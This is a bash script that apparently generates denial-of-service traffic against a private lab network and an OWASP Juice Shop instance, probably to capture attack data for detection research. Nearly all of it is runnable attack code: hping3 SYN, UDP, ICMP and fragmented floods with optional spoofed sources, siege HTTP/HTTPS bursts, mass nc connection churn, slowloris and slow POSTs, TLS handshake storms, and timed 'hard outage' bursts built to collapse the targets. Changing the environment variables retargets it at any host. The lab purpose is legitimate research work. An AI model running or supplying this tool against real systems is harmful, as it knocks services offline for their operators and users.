#!/usr/bin/env bash
# ==============================================================================
# Balanced DoS lab traffic generator (single script, full diversity)
# ==============================================================================
# Default IPs/ports match the original lab layout (META=hping3/nc, JUICE=Juice Shop).
# Run:   sudo ./dos_generator.sh
# Override any value via env, e.g. TARGET_IP=10.0.0.3 HTTP_HOST=10.0.0.4 sudo -E ./dos_generator.sh
#
# Diversity per rotation (fixed order — every class gets time):
#   1) L3 volumetric: SYN flood → UDP flood → ICMP flood (hping3)
#   2) L7 burst: siege HTTP + HTTPS (+ Juice Shop search if enabled)
#   3) L4 churn: parallel TCP connects (nc), capped
#   4) Slow DoS: slowloris (if installed) + rate-limited curl
#   5) TLS: many openssl handshakes
#   6) L3/L4 odd: TCP flag mix + fragmented SYN (hping3)
#   7) Mixed: moderate siege + nc in parallel
#
# Optional env:
#   DURATION_SEC=600          Total runtime (default: 600)
#   MODE=mixed               Run profile: pressure|outage|mixed (default: mixed)
#   BENIGN_BACKGROUND=1       Curl noise in background (default: 0)
#   HPING3_RAND_SOURCE=1      Random/spoofed src — huge flow count (default: 0)
#   SIEGE_MAX_CONCURRENCY=35  Cap for siege -c
#   NC_CONN_CAP=80            Max parallel nc per inner loop
#   NC_TARGET_PORT=80         Port for nc connection churn (default: 80)
#   OUTAGE_BURST_SEC=90       One scheduled hard-outage burst duration (default: 90)
#   OUTAGE_SCOPE=both         Outage target scope: meta|juice|both (default: both)
#   OUTAGE_BURST_COUNT=2      Number of outage bursts per run (default: 2)
#
# Requires: bash, curl, timeout, nc, openssl, hping3, siege
# Optional: slowloris (PATH), passwordless sudo for raw-socket hping3
# ==============================================================================
set -euo pipefail

# --- Lab defaults (original META / JUICE split) ---
TARGET_IP="${TARGET_IP:-192.168.100.193}"   # L3/L4 floods + nc target (was META)
HTTP_HOST="${HTTP_HOST:-192.168.100.158}"   # HTTP/S HTTPS/TLS/slowloris (was JUICE)
HTTP_PORT="${HTTP_PORT:-3000}"
HTTPS_PORT="${HTTPS_PORT:-8443}"

DURATION_SEC="${DURATION_SEC:-600}"
MODE="${MODE:-mixed}"
BENIGN_BACKGROUND="${BENIGN_BACKGROUND:-0}"
HPING3_RAND_SOURCE="${HPING3_RAND_SOURCE:-0}"
SIEGE_MAX_CONCURRENCY="${SIEGE_MAX_CONCURRENCY:-35}"
NC_CONN_CAP="${NC_CONN_CAP:-80}"
NC_TARGET_PORT="${NC_TARGET_PORT:-80}"
# Juice Shop API paths for siege/curl (disable with USE_JUICE_SHOP_PATHS=0 for generic web)
USE_JUICE_SHOP_PATHS="${USE_JUICE_SHOP_PATHS:-1}"
OUTAGE_BURST_SEC="${OUTAGE_BURST_SEC:-90}"
OUTAGE_SCOPE="${OUTAGE_SCOPE:-both}"
OUTAGE_BURST_COUNT="${OUTAGE_BURST_COUNT:-2}"

HTTP_BASE="http://${HTTP_HOST}:${HTTP_PORT}"
HTTPS_BASE="https://${HTTP_HOST}:${HTTPS_PORT}"

###############################################
# CLEANUP
###############################################
cleanup() {
  echo
  echo "[!] Stopping background jobs..."
  jobs -p 2>/dev/null | xargs -r kill 2>/dev/null || true
  wait 2>/dev/null || true
  echo "[+] Cleanup complete"
}
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 143' TERM
trap cleanup EXIT

###############################################
# HELPERS
###############################################
log() { echo "[+] $*"; }

usage() {
  cat <<'EOF'
Usage:
  sudo ./dos_generator.sh [--mode pressure|outage|mixed]

Modes:
  pressure   realistic mixed pressure phases, no hard outage bursts
  outage     stronger repeated outage bursts within runtime window
  mixed      pressure phases + scheduled outage bursts
EOF
}

hping_rand_args() {
  if [[ "${HPING3_RAND_SOURCE}" == "1" ]]; then
    echo "--rand-source"
  fi
}

siege_c() {
  local cap="$SIEGE_MAX_CONCURRENCY"
  [[ "$cap" -lt 10 ]] && cap=10
  local span=$((cap - 5))
  [[ "$span" -lt 1 ]] && span=1
  echo $((RANDOM % span + 5))
}

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[!] Missing dependency: $1" >&2
    return 1
  }
}

# CLI (optional): --mode pressure|outage|mixed
while [[ $# -gt 0 ]]; do
  case "$1" in
    --mode)
      MODE="${2:-}"
      shift 2
      ;;
    --mode=*)
      MODE="${1#*=}"
      shift
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      echo "[!] Unknown argument: $1" >&2
      usage
      exit 1
      ;;
  esac
done

MODE="$(printf '%s' "$MODE" | tr '[:upper:]' '[:lower:]')"
if [[ "$MODE" != "pressure" && "$MODE" != "outage" && "$MODE" != "mixed" ]]; then
  echo "[!] Invalid MODE='$MODE' (expected pressure|outage|mixed)" >&2
  exit 1
fi

###############################################
# BENIGN MIX (optional — for mixed captures)
###############################################
benign_noise_loop() {
  while true; do
    if [[ "${USE_JUICE_SHOP_PATHS}" == "1" ]]; then
      case $((RANDOM % 5)) in
        0) curl -sS "$HTTP_BASE/" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
        1) curl -sS "$HTTP_BASE/rest/products/$((RANDOM % 10))" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
        2) curl -skS "$HTTPS_BASE/" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
        3) curl -skS "$HTTPS_BASE/rest/products/search?q=test${RANDOM}" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
        4) curl -sS "$HTTP_BASE/" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
      esac
    else
      case $((RANDOM % 3)) in
        0) curl -sS "$HTTP_BASE/" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
        1) curl -skS "$HTTPS_BASE/" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
        2) curl -sS "$HTTP_BASE/" -o /dev/null --connect-timeout 3 --max-time 15 || true ;;
      esac
    fi
    sleep $((RANDOM % 4 + 1))
  done
}

if [[ "${BENIGN_BACKGROUND}" == "1" ]]; then
  require_cmd curl || exit 1
  benign_noise_loop &
  log "Benign background traffic enabled (BENIGN_BACKGROUND=1)"
fi

###############################################
# ATTACK KERNELS (short, composable)
###############################################

# L3/L4: volumetric — default fixed src IP for saner flow cardinality
phase_l3_syn_udp_icmp() {
  local budget="${1:-120}"
  local third=$((budget / 3))
  [[ "$third" -ge 5 ]] || third=5
  log "Phase: L3 SYN → UDP → ICMP (~${budget}s total, ~${third}s each)"
  local ra
  ra="$(hping_rand_args)"

  if command -v sudo >/dev/null && sudo -n true 2>/dev/null; then
    timeout "$third" sudo hping3 -S "$TARGET_IP" -p 80 --flood $ra || true
    timeout "$third" sudo hping3 --udp -p 53 --flood "$TARGET_IP" $ra || true
    timeout "$third" sudo hping3 --icmp "$TARGET_IP" --flood || true
  else
    log "  (skip raw hping3 floods: run with passwordless sudo for SYN/UDP/ICMP)"
    sleep "$budget"
  fi
}

phase_tcp_malformed_flags() {
  local budget="${1:-45}"
  log "Phase: TCP odd flags + fragmentation (~${budget}s)"
  local ra
  ra="$(hping_rand_args)"
  if command -v sudo >/dev/null && sudo -n true 2>/dev/null; then
    timeout "$((budget / 2))" sudo hping3 -S -A -F "$TARGET_IP" -p 80 --flood $ra &
    timeout "$((budget / 2))" sudo hping3 -S -f "$TARGET_IP" -p 80 --flood $ra &
    wait || true
  else
    sleep "$budget"
  fi
}

# L4: connection churn — capped parallel opens
phase_tcp_connect_churn() {
  local budget="${1:-60}"
  log "Phase: TCP connection churn (nc × cap=${NC_CONN_CAP} → ${TARGET_IP}:${NC_TARGET_PORT}, ~${budget}s)"
  require_cmd nc
  timeout "$budget" bash -c "
    set +e
    end=\$((SECONDS + ${budget} - 2))
    while [ \$SECONDS -lt \$end ]; do
      for i in \$(seq 1 ${NC_CONN_CAP}); do
        nc -w2 ${TARGET_IP} ${NC_TARGET_PORT} </dev/null >/dev/null 2>&1 &
      done
      wait
      sleep 0.3
    done
  " || true
}

# L7: application-layer bursts + slightly longer sessions
phase_l7_http_https() {
  local budget="${1:-120}"
  log "Phase: HTTP/HTTPS siege (~${budget}s)"
  require_cmd siege
  local c t
  c="$(siege_c)"
  t="${budget}s"
  timeout "$((budget + 5))" siege -b -c"$c" -t"$t" "$HTTP_BASE/" &
  timeout "$((budget + 5))" siege -b -c"$c" -t"$t" "$HTTPS_BASE/" &
  if [[ "${USE_JUICE_SHOP_PATHS}" == "1" ]]; then
    timeout "$((budget + 5))" siege -b -c"$c" -t"$t" "${HTTP_BASE}/rest/products/search?q=${RANDOM}" &
  fi
  wait || true
}

# Slow DoS: longer flow lifetimes
phase_slowlayer() {
  local budget="${1:-120}"
  log "Phase: slow HTTP / Slowloris-style (~${budget}s)"
  if command -v slowloris >/dev/null 2>&1; then
    timeout "$((budget / 2))" slowloris "$HTTP_HOST" -p "${HTTPS_PORT}" -s "$((RANDOM % 30 + 15))" &
  else
    log "  (slowloris not in PATH — slow POST/curl only)"
  fi
  if [[ "${USE_JUICE_SHOP_PATHS}" == "1" ]]; then
    timeout "$budget" bash -c "
      for i in \$(seq 1 $((RANDOM % 8 + 6))); do
        curl -skS -X POST '${HTTPS_BASE}/rest/user/login' \
          -H 'Content-Type: application/json' \
          --data '{\"email\":\"slow\",\"password\":\"slow\"}' \
          --limit-rate $((RANDOM % 40 + 8))k \
          --max-time 90 &
      done
      wait
    " &
  else
    timeout "$budget" bash -c "
      for i in \$(seq 1 $((RANDOM % 8 + 6))); do
        curl -skS -N '${HTTPS_BASE}/' \
          --limit-rate $((RANDOM % 40 + 8))k \
          --max-time 90 &
      done
      wait
    " &
  fi
  wait || true
}

# TLS: many handshakes — bounded parallelism
phase_tls_handshake_storm() {
  local budget="${1:-90}"
  log "Phase: TLS handshake storm (~${budget}s)"
  require_cmd openssl
  timeout "$budget" bash -c "
    for i in \$(seq 1 60); do
      timeout 3 openssl s_client -connect ${HTTP_HOST}:${HTTPS_PORT} -quiet </dev/null 2>/dev/null &
      if (( i % 15 == 0 )); then wait; fi
    done
    wait
  " || true
}

# Low-rate mixed: simulates “realistic chaos” without always maxing everything
phase_mixed_moderate() {
  local budget="${1:-90}"
  local half=$((budget / 2))
  [[ "$half" -ge 5 ]] || half=5
  log "Phase: mixed moderate intensity (siege || nc, ~${budget}s)"
  require_cmd siege
  local c
  c=$((RANDOM % 15 + 8))
  timeout "$half" siege -b -c"$c" -t"${budget}s" "$HTTP_BASE/" &
  (
    start=$(date +%s)
    end=$((start + half))
    while [[ $(date +%s) -lt $end ]]; do
      for i in $(seq 1 "${NC_CONN_CAP}"); do
        nc -w2 "${TARGET_IP}" "${NC_TARGET_PORT}" </dev/null >/dev/null 2>&1 &
      done
      wait || true
      sleep 0.3
    done
  ) &
  wait || true
}

# Scheduled hard-outage burst: short, intense, and time-bounded.
# Keeps realism (finite window), but guarantees at least one collapse-style segment.
phase_outage_burst() {
  local budget="${1:-90}"
  local hard_c=$((SIEGE_MAX_CONCURRENCY + 25))
  local hard_nc=$((NC_CONN_CAP + 120))
  if [[ "$MODE" == "outage" ]]; then
    # In outage mode, push a stronger collapse segment.
    hard_c=$((hard_c + 30))
    hard_nc=$((hard_nc + 220))
  fi
  [[ "$hard_c" -ge 40 ]] || hard_c=40
  [[ "$hard_nc" -ge 180 ]] || hard_nc=180

  log "Phase: HARD outage burst (~${budget}s, scope=${OUTAGE_SCOPE}, siege c=${hard_c}, nc cap=${hard_nc})"

  if [[ "${OUTAGE_SCOPE}" == "meta" || "${OUTAGE_SCOPE}" == "both" ]]; then
    if command -v sudo >/dev/null && sudo -n true 2>/dev/null; then
    # Keep source stable by default (rand-source only when explicitly enabled).
      local ra
      ra="$(hping_rand_args)"
      timeout "$budget" sudo hping3 -S "$TARGET_IP" -p 80 --flood $ra >/dev/null 2>&1 &
    else
      log "  (no passwordless sudo: skipping hping3 leg in outage burst)"
    fi
  fi

  if [[ "${OUTAGE_SCOPE}" == "juice" || "${OUTAGE_SCOPE}" == "both" ]]; then
    if command -v sudo >/dev/null && sudo -n true 2>/dev/null; then
      local ra
      ra="$(hping_rand_args)"
      timeout "$budget" sudo hping3 -S "$HTTP_HOST" -p "$HTTP_PORT" --flood $ra >/dev/null 2>&1 &
    else
      log "  (no passwordless sudo: skipping hping3 Juice leg in outage burst)"
    fi
    timeout "$budget" siege -b -c"$hard_c" -t"${budget}s" "$HTTP_BASE/" >/dev/null 2>&1 &
    timeout "$budget" siege -b -c"$hard_c" -t"${budget}s" "$HTTPS_BASE/" >/dev/null 2>&1 &
  fi

  # Aggressive short-lived TCP churn in parallel for backlog/socket pressure.
  (
    start=$(date +%s)
    end=$((start + budget))
    while [[ $(date +%s) -lt $end ]]; do
      if [[ "${OUTAGE_SCOPE}" == "meta" || "${OUTAGE_SCOPE}" == "both" ]]; then
        for i in $(seq 1 "$hard_nc"); do
          nc -w1 "$TARGET_IP" "$NC_TARGET_PORT" </dev/null >/dev/null 2>&1 &
        done
      fi
      if [[ "${OUTAGE_SCOPE}" == "juice" || "${OUTAGE_SCOPE}" == "both" ]]; then
        for i in $(seq 1 "$hard_nc"); do
          nc -w1 "$HTTP_HOST" "$HTTP_PORT" </dev/null >/dev/null 2>&1 &
        done
      fi
      wait || true
      sleep 0.2
    done
  ) &

  wait || true
}

###############################################
# MAIN: fixed phase order → guaranteed diversity each rotation
###############################################
main() {
  require_cmd curl
  require_cmd timeout
  require_cmd bash

  log "Balanced DoS suite"
  log "  L3/L4 target: ${TARGET_IP} (nc :${NC_TARGET_PORT})  |  L7/TLS host: ${HTTP_HOST}"
  log "  HTTP=${HTTP_BASE}  HTTPS=${HTTPS_BASE}"
  log "  MODE=$MODE  DURATION_SEC=$DURATION_SEC  OUTAGE_BURST_SEC=$OUTAGE_BURST_SEC  OUTAGE_SCOPE=$OUTAGE_SCOPE  HPING3_RAND_SOURCE=$HPING3_RAND_SOURCE  USE_JUICE_SHOP_PATHS=${USE_JUICE_SHOP_PATHS}"

  # ~7 phases per rotation; keep each leg near this budget so one loop ≈ DURATION_SEC.
  local slice
  slice=$((DURATION_SEC / 7))
  if [[ "$slice" -lt 20 ]]; then
    slice=20
  fi

  local end_ts=$((SECONDS + DURATION_SEC))
  local start_ts=$SECONDS
  local outages_done=0
  local burst_count="$OUTAGE_BURST_COUNT"
  [[ "$burst_count" -ge 1 ]] || burst_count=1
  local trigger1=$((DURATION_SEC * 35 / 100))
  local trigger2=$((DURATION_SEC * 70 / 100))

  while [[ $SECONDS -lt $end_ts ]]; do
    if [[ "$MODE" != "outage" ]]; then
      phase_l3_syn_udp_icmp "$slice"
      phase_l7_http_https "$slice"
      phase_tcp_connect_churn "$slice"
      phase_slowlayer "$slice"
      phase_tls_handshake_storm "$slice"
      phase_tcp_malformed_flags "$((slice / 2 + 10))"
      phase_mixed_moderate "$slice"
    fi

    # Outage scheduling:
    # - mixed: two scheduled bursts layered into pressure cycles
    # - outage: repeated stronger bursts through the full runtime
    local elapsed=$((SECONDS - start_ts))
    local remain=$((end_ts - SECONDS))
    if [[ "$MODE" == "mixed" ]]; then
      if [[ $outages_done -eq 0 && $elapsed -ge $trigger1 && $remain -ge 20 ]]; then
        local ob="$OUTAGE_BURST_SEC"
        if [[ $ob -gt $remain ]]; then ob="$remain"; fi
        phase_outage_burst "$ob"
        outages_done=1
      elif [[ $burst_count -ge 2 && $outages_done -eq 1 && $elapsed -ge $trigger2 && $remain -ge 20 ]]; then
        local ob="$OUTAGE_BURST_SEC"
        if [[ $ob -gt $remain ]]; then ob="$remain"; fi
        phase_outage_burst "$ob"
        outages_done=2
      fi
    elif [[ "$MODE" == "outage" ]]; then
      if [[ $remain -ge 20 ]]; then
        local ob="$OUTAGE_BURST_SEC"
        if [[ $ob -gt $remain ]]; then ob="$remain"; fi
        phase_outage_burst "$ob"
        outages_done=$((outages_done + 1))
        sleep 3
      fi
    fi

    [[ $SECONDS -lt $end_ts ]] || break
    log "--- cycle complete ($(date -Is)) ---"
  done

  # Fallback: mixed mode only — if timing drift prevented scheduled bursts, fire at end.
  while [[ "$MODE" == "mixed" && $outages_done -lt $burst_count ]]; do
    local remain=$((end_ts - SECONDS))
    if [[ $remain -lt 20 ]]; then
      break
    fi
    local ob="$OUTAGE_BURST_SEC"
    if [[ $ob -gt $remain ]]; then
      ob="$remain"
    fi
    phase_outage_burst "$ob"
    outages_done=$((outages_done + 1))
  done

  log "Balanced DoS suite finished (budget ${DURATION_SEC}s)"
}

main
